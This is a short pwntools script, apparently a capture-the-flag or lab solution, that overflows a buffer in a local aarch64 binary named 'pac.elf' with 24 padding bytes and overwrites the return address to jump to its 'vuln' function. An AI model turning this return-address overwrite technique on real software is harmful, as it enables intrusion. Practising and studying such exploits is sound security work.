from pwn import *

context.arch = "aarch64"

elf = ELF("./pac.elf")

#print(pwnlib.qemu.ld_prefix())

p = process("./pac.elf")

buf = b'A'*24

payload = buf + p64(elf.symbols['vuln'])

p.sendline(payload)

p.interactive()